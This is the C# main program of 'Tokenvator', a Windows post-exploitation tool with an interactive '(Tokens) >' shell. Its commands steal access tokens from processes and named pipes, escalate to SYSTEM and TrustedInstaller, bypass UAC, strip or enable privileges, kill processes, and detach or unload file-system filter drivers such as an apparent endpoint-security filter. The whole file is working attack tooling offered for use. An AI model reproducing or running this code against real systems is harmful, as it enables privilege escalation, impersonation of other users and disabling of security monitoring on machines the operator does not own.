using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Security.Principal;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;



////////////////////////////////////////////////////////////////////////////////
// https://github.com/clymb3r/PowerShell/blob/master/Invoke-TokenManipulation/Invoke-TokenManipulation.ps1
////////////////////////////////////////////////////////////////////////////////
namespace Tokenvator
{
    class Program
    {
        ////////////////////////////////////////////////////////////////////////////////
        // Put a loop here for chained commands - split on ;
        ////////////////////////////////////////////////////////////////////////////////
        static void Main(string[] args)
        {
            if (0 < args.Length)
            {
                using (System.IO.MemoryStream memeoryStream = new System.IO.MemoryStream())
                {
                    using (System.IO.StreamWriter streamWriter = new System.IO.StreamWriter(memeoryStream))
                    {
                        using (System.IO.StreamReader streamReader = new System.IO.StreamReader(memeoryStream))
                        {
                            String[] commands = String.Join(" ", args).Split(new String[] { ";" }, StringSplitOptions.RemoveEmptyEntries);
                            Int32 offset = 0;
                            foreach (String command in commands)
                            {
                                streamWriter.Write(command.Trim());
                                streamWriter.Flush();
                               
                                memeoryStream.Seek(offset, System.IO.SeekOrigin.Begin);
                                Console.SetIn(streamReader);

                                new MainLoop(false).Run();
                                offset += command.Trim().Length;
                            }
                        }
                    }
                }
                return;
            }

            MainLoop mainLoop = new MainLoop(true);
            while (true)
            {
                mainLoop.Run();
            }
        }

    }

    class MainLoop
    {
        private static String context = "(Tokens) > ";
        public static String[,] options = new String[,] {
            {"Info", "-", "-", "-"},
            {"Help", "Command", "-", "Help List_Filter_Instances"},

            {"List_Privileges", "ProcessID", "-", "List_Privileges 2180"},
            {"Enable_Privilege", "ProcessID", "Privilege", "Enable_Privilege 2180 SeShutdownPrivilege"},
            {"Disable_Privilege", "ProcessID", "Privilege", "Disable_Privilege 2180 SeShutdownPrivilege"},
            {"Remove_Privilege", "ProcessID", "Privilege", "Remove_Privilege 2180 SeShutdownPrivilege"},
            {"Nuke_Privileges", "ProcessID", "-", "Nuke_Privileges 2180"},

            {"Terminate", "ProcessID", "-", "Terminate 2180"},

            {"GetSystem", "Command", "-", "GetSystem | GetSystem cmd.exe /c powershell.exe"},
            {"GetTrustedInstaller", "Command", "-", "GetTrustedInstaller | cmd.exe /c powershell.exe"},
            {"Steal_Token", "Command", "ProcessID", "Steal_Token 2180 | Steal_Token 2180 cmd.exe"},
            {"Steal_Pipe_Token", "Command", "PipeName", @"Steal_Pipe_Token \\.\pipe\tokenvator | Steal_Pipe_Token \\.\pipe\tokenvator cmd.exe"},
            {"BypassUAC", "ProcessID", "Command", "BypassUAC cmd.exe| BypassUAC 892 cmd.exe"},

            {"Sample_Processes", "-", "-", "Sample_Processes"},
            {"Sample_Processes_WMI", "-", "-", "Sample_Processes"},

            {"Find_User_Processes", "-", "User", "Find_User_Processes Administrator"},
            {"Find_User_Processes_WMI", "-", "User", "Find_User_Processes_WMI Administrator"},

            {"List_Filters", "-", "-", "List_Filters"},
            {"List_Filter_Instances", "-", "FilterName", "List_Filter_Instances vsepflt"},
            {"Detach_Filter", "InstanceName", "FilterName, VolumeName", @"Detach_Filter vsepflt \Device\Mup vsepflt Instance"},
            {"Unload_Filter", "-", "FilterName", "Unload_Filter vsepflt"},


            {"Sessions", "-", "-", "Sessions"},
            {"WhoAmI", "-", "-", "WhoAmI"},
            {"RevertToSelf", "-", "-", "RevertToSelf"},
            {"Run", "-", "Command", "Run ipconfig"},
            {"RunPowerShell", "-", "Command", "RunPowerShell Get-ChildItem"},
            {"", "", "", ""}
        };

        private IntPtr currentProcessToken;
        private Dictionary<String, UInt32> users;
        private Dictionary<UInt32, String> processes;

        private IntPtr hProcess;
        private IntPtr hBackup;
        private Int32 processID;
        private String command;

        private TabComplete console;
        private Boolean activateTabs;

        public MainLoop(Boolean activateTabs)
        {
            this.activateTabs = activateTabs;
            if (activateTabs)
            {
                console = new TabComplete(context, options);
            }

            hProcess = Process.GetCurrentProcess().Handle;
            hBackup = hProcess;
        }

        internal void Run()
        {
            try
            {
                Console.Write(context);
                String input;
                if (activateTabs)
                {
                    try
                    {
                        input = console.ReadLine();
                    }
                    catch (InvalidOperationException)
                    {
                        input = Console.ReadLine();
                    }
                }
                else
                {
                    input = Console.ReadLine();
                }

                IntPtr hToken, tempToken;
                hToken = tempToken = IntPtr.Zero;
                kernel32.OpenProcessToken(kernel32.GetCurrentProcess(), Constants.TOKEN_ALL_ACCESS, out hToken);
                switch (NextItem(ref input))
                {
                    case "info":
                        if (GetProcessID(input, out processID, out command) && OpenToken(processID, ref tempToken))
                        {
                            hToken = tempToken;
                        }
                        Console.WriteLine("");
                        CheckPrivileges.GetTokenUser(hToken);
                        Console.WriteLine("");
                        CheckPrivileges.GetTokenOwner(hToken);
                        Console.WriteLine("");
                        CheckPrivileges.GetTokenGroups(hToken);
                        Console.WriteLine("");
                        Winnt._TOKEN_TYPE tokenType = new Winnt._TOKEN_TYPE();
                        CheckPrivileges.GetElevationType(hToken, out tokenType);
                        CheckPrivileges.PrintElevation(hToken);
                        break;
                    case "list_privileges":
                        if (GetProcessID(input, out processID, out command))
                            if (OpenToken(processID, ref tempToken))
                                hToken = tempToken;
                            else
                                break;
                        Tokens.EnumerateTokenPrivileges(hToken);
                        break;
                    case "enable_privilege":
                        if (GetProcessID(input, out processID, out command))
                            if (OpenToken(processID, ref tempToken))
                                hToken = tempToken;
                            else
                                break;
                        Tokens.SetTokenPrivilege(ref hToken, command, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED);
                        break;
                    case "disable_privilege":
                        if (GetProcessID(input, out processID, out command))
                            if (OpenToken(processID, ref tempToken))
                                hToken = tempToken;
                            else
                                break;
                        Tokens.SetTokenPrivilege(ref hToken, command, Winnt.TokenPrivileges.SE_PRIVILEGE_NONE);
                        break;
                    case "remove_privilege":
                        if (GetProcessID(input, out processID, out command))
                            if (OpenToken(processID, ref tempToken))
                                hToken = tempToken;
                            else
                                break;
                        Tokens.SetTokenPrivilege(ref hToken, command, Winnt.TokenPrivileges.SE_PRIVILEGE_REMOVED);
                        break;
                    case "nuke_privileges":
                        if (GetProcessID(input, out processID, out command))
                            if (OpenToken(processID, ref tempToken))
                                hToken = tempToken;
                            else
                                break;
                        Tokens.DisableAndRemoveAllTokenPrivileges(ref hToken);
                        break;
                    case "terminate":
                        if (GetProcessID(input, out processID, out command))
                        {
                            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_TERMINATE, false, (UInt32)processID);
                            if (IntPtr.Zero == hProcess)
                            {
                                Tokens.GetWin32Error("OpenProcess");
                                break;
                            }
                            Console.WriteLine("[*] Recieved Process Handle 0x{0}", hProcess.ToString("X4"));
                            if (!kernel32.TerminateProcess(hProcess, 0))
                            {
                                Tokens.GetWin32Error("TerminateProcess");
                                break;
                            }
                            Console.WriteLine("[+] Process Terminated");
                        }
                        break;
                    case "sample_processes":
                        users = Enumeration.EnumerateTokens(false);
                        Console.WriteLine("{0,-40}{1,-20}{2}", "User", "Process ID", "Process Name");
                        Console.WriteLine("{0,-40}{1,-20}{2}", "----", "----------", "------------");
                        foreach (String name in users.Keys)
                        {
                            Console.WriteLine("{0,-40}{1,-20}{2}", name, users[name], Process.GetProcessById((Int32)users[name]).ProcessName);
                        }
                        break;
                    case "sample_processes_wmi":
                        users = Enumeration.EnumerateTokensWMI();
                        Console.WriteLine("{0,-40}{1,-20}{2}", "User", "Process ID", "Process Name");
                        Console.WriteLine("{0,-40}{1,-20}{2}", "----", "----------", "------------");
                        foreach (String name in users.Keys)
                        {
                            Console.WriteLine("{0,-40}{1,-20}{2}", name, users[name], Process.GetProcessById((Int32)users[name]).ProcessName);
                        }
                        break;
                    case "find_user_processes":
                        processes = Enumeration.EnumerateUserProcesses(false, input);
                        Console.WriteLine("{0,-30}{1,-30}", "Process ID", "Process Name");
                        Console.WriteLine("{0,-30}{1,-30}", "----------", "------------");
                        foreach (UInt32 pid in processes.Keys)
                        { 
                            Console.WriteLine("{0,-30}{1,-30}", pid, processes[pid]);
                        }
                        break;
                    case "find_user_processes_wmi":
                        processes = Enumeration.EnumerateUserProcessesWMI(input);
                        Console.WriteLine("{0,-30}{1,-30}", "Process ID", "Process Name");
                        Console.WriteLine("{0,-30}{1,-30}", "----------", "------------");
                        foreach (UInt32 pid in processes.Keys)
                        {
                            Console.WriteLine("{0,-30}{1,-30}", pid, processes[pid]);
                        }
                        break;
                    case "list_filters":
                        using (Filters filters = new Filters())
                        {
                            filters.First();
                            filters.Next();
                        }
                        break;
                    case "list_filter_instances":
                        using (FilterInstance filterInstance = new FilterInstance(NextItem(ref input)))
                        {
                            filterInstance.First();
                            filterInstance.Next();
                        }
                        break;
                    case "detach_filter":
                        Filters.FilterDetach(input);
                        break;
                    case "unload_filter":
                        Filters.Unload(NextItem(ref input));
                        break;
                    case "sessions":
                        Enumeration.EnumerateInteractiveUserSessions();
                        break;
                    case "getsystem":
                        GetSystem(input, hToken);
                        break;
                    case "gettrustedinstaller":
                        GetTrustedInstaller(input);
                        break;
                    case "steal_token":
                        StealToken(input);
                        break;
                    case "steal_pipe_token":
                        StealPipeToken(input);
                        break;
                    case "bypassuac":
                        BypassUAC(input);
                        break;
                    case "whoami":
                        Console.WriteLine("[*] Operating as {0}", WindowsIdentity.GetCurrent().Name);
                        break;
                    case "reverttoself":
                        String message = advapi32.RevertToSelf() ? "[*] Reverted token to " + WindowsIdentity.GetCurrent().Name : "[-] RevertToSelf failed";
                        Console.WriteLine(message);
                        break;
                    case "run":
                        Run(input);
                        break;
                    case "runpowershell":
                        RunPowerShell(input);
                        break;
                    case "exit":
                        Environment.Exit(0);
                        break;
                    case "help":
                        String item = NextItem(ref input);
                        if ("help" != item)
                            Help(item);
                        else
                            Help();
                        break;
                    default:
                        Help();
                        break;
                }
                if (IntPtr.Zero != hToken)
                {
                    kernel32.CloseHandle(hToken);
                }
                Console.WriteLine();
            }
            catch (Exception error)
            {
                Console.WriteLine(error.ToString());
                Tokens.GetWin32Error("MainLoop");
            }
            finally
            {

            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Open Process and a process token
        ////////////////////////////////////////////////////////////////////////////////
        private static Boolean OpenToken(Int32 processID, ref IntPtr hToken)
        {
            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, false, (UInt32)processID);
            if (IntPtr.Zero == hProcess)
            {
                Tokens.GetWin32Error("OpenProcess");
                return false;
            }
            Console.WriteLine("[*] Recieved Process Handle 0x{0}", hProcess.ToString("X4"));
            if (!kernel32.OpenProcessToken(hProcess, Constants.TOKEN_ALL_ACCESS, out hToken))
            {
                if (!kernel32.OpenProcessToken(hProcess, (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED, out hToken))
                {
                    Tokens.GetWin32Error("OpenProcessToken");
                    return false;
                }
            }
            Console.WriteLine("[*] Recieved Token Handle 0x{0}", hToken.ToString("X4"));
            kernel32.CloseHandle(hProcess);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Identifies a process to access
        ////////////////////////////////////////////////////////////////////////////////
        private static Boolean GetProcessID(String input, out Int32 processID, out String command)
        {
            String name = NextItem(ref input);
            command = String.Empty;

            if (name != input)
            {
                command = input;
            }

            processID = 0;
            if (Int32.TryParse(name, out processID))
            {
                return true;
            }

            Process[] process = Process.GetProcessesByName(name);
            if (0 < process.Length)
            {
                processID = process.First().Id;
                return true;
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Identifies a process to access
        ////////////////////////////////////////////////////////////////////////////////
        public static Boolean GetPipeName(String input, out String pipeName, out String command)
        {
            String name = NextItem(ref input);
            command = String.Empty;

            if (name != input)
            {
                command = input;
            }

            if (name.Contains(@"\\.\pipe"))
            {
                pipeName = name;
                return true;
            }
            else
            {
                pipeName = String.Empty;
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Pops an item from the input and returns the item - only used in inital menu
        // Taken from FowlPlay
        ////////////////////////////////////////////////////////////////////////////////
        public static String NextItem(ref String input)
        {
            String option = String.Empty;
            String[] options = input.Split(new String[] { " " }, StringSplitOptions.RemoveEmptyEntries);
            if (options.Length > 1)
            {
                option = options[0];
                input = String.Join(" ", options, 1, options.Length - 1);
            }
            else
            {
                option = input;
            }
            return option.ToLower();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void GetSystem(String input, IntPtr hToken)
        {
            Boolean exists, enabled;
            CheckPrivileges.CheckTokenPrivilege(hToken, "SeDebugPrivilege", out exists, out enabled);
            String item = NextItem(ref input);

            if (exists)
            {
                if ("getsystem" == item)
                {

                    using (Tokens t = new Tokens())
                    {
                        t.GetSystem();
                    }
                }
                else
                {
                    using (Tokens t = new Tokens())
                    {
                        t.GetSystem(item + " " + input);
                    }
                }
            }
            else
            {
                if ("getsystem" == item)
                {
                    NamedPipes.GetSystem();
                }
                else
                {
                    NamedPipes.GetSystem(input, item + " " + input);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void GetTrustedInstaller(String input)
        {
            if ("gettrustedinstaller" == NextItem(ref input))
            {
                using (Tokens t = new Tokens())
                {
                    t.GetTrustedInstaller();
                }
            }
            else
            {
                using (Tokens t = new Tokens())
                {
                    t.GetTrustedInstaller(input);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void BypassUAC(String input)
        {
            Int32 processID;
            String command;

            if (GetProcessID(input, out processID, out command))
            {
                using (RestrictedToken rt = new RestrictedToken())
                {
                    rt.BypassUAC(processID, command);
                }
            }
            else
            {
                String name = WindowsIdentity.GetCurrent().Name;
                Dictionary<UInt32, String> uacUsers = Enumeration.EnumerateUserProcesses(true, name);
                foreach (UInt32 pid in uacUsers.Keys)
                {
                    Console.WriteLine("\n[*] Attempting Bypass with PID {0} ({1})", pid, uacUsers[pid]);
                    using (RestrictedToken rt = new RestrictedToken())
                    {
                        rt.BypassUAC((Int32)pid, input);
                    }
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void StealToken(String input)
        {
            Int32 processID = 0;
            String command = String.Empty;
            if (GetProcessID(input, out processID, out command))
            {
                if (String.IsNullOrEmpty(command))
                {
                    using (Tokens t = new Tokens())
                    {
                        t.ImpersonateUser(processID);
                    }
                }
                else
                {
                    using (Tokens t = new Tokens())
                    {
                        t.StartProcessAsUser(processID, command);
                    }
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void StealPipeToken(String input)
        {
            String pipeName, command;
            pipeName = command = String.Empty;
            if (GetPipeName(input, out pipeName, out command))
            {
                if (pipeName.ToLower() == command.ToLower())
                {
                    NamedPipes.GetPipeToken(pipeName);
                }
                else
                {
                    Console.WriteLine("[*] Running {0}", command);
                    NamedPipes.GetPipeToken(pipeName, command);
                }
            }
            else if ("getsystem" == NextItem(ref input))
            {
                NamedPipes.GetSystem();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal static void RunPowerShell(string command)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(command);
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            foreach (PSObject obj in results)
            {
                Console.WriteLine(obj.ToString());
            }
        }



        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void Run(String input)
        {
            String command = NextItem(ref input);
            Process process = new Process();
            process.StartInfo.FileName = command;
            String args = NextItem(ref input);
            if (args == command)
            {
                args = String.Empty;
            }
            else
            {
                args += " " + input;
            }
            process.StartInfo.Arguments = args;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            Console.WriteLine(process.StandardOutput.ReadToEnd());
            Console.WriteLine(process.StandardError.ReadToEnd());
            process.WaitForExit();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static void Help()
        {
            Console.WriteLine("{0,-25}{1,-20}{2,-20}", "Name", "Optional", "Required");
            Console.WriteLine("{0,-25}{1,-20}{2,-20}", "----", "--------", "--------"); 
            for (Int32 i = 0; i < options.GetLength(0); i++)
            {
                Console.WriteLine("{0,-25}{1,-20}{2,-20}", options[i, 0], options[i, 1], options[i, 2]);
            }
            Console.WriteLine("e.g. (Tokens)> Help List_Filter_Instances");
            Console.WriteLine("e.g. (Tokens)> Help Privileges");
            Console.WriteLine("");
            Console.WriteLine("e.g. (Tokens)> Steal_Token 27015");
            Console.WriteLine("e.g. (Tokens)> Steal_Token 27015 cmd.exe");
            Console.WriteLine("e.g. (Tokens)> Enable_Privilege SeDebugPrivilege");
            Console.WriteLine("e.g. (Tokens)> Enable_Privilege 27015 SeDebugPrivilege");
        }

        public static void Help(String input)
        {
            if ("privileges" == input.ToLower())
            {
                foreach (String item in Tokens.validPrivileges)
                {
                    Console.WriteLine(item);
                }
                return;
            }

            Console.WriteLine("{0,-25}{1,-20}{2,-20}", "Name", "Optional", "Required");
            Console.WriteLine("{0,-25}{1,-20}{2,-20}", "----", "--------", "--------");
            for (Int32 i = 0; i < options.GetLength(0); i++)
            {
                if (input.ToLower() == options[i, 0].ToLower())
                {
                    Console.WriteLine("{0,-25}{1,-20}{2,-20}", options[i, 0], options[i, 1], options[i, 2]);
                    Console.WriteLine(" ");
                    Console.WriteLine("e.g. (Tokens)> {0}", options[i, 3]);
                    return;
                }
            }
            
        }
    }
}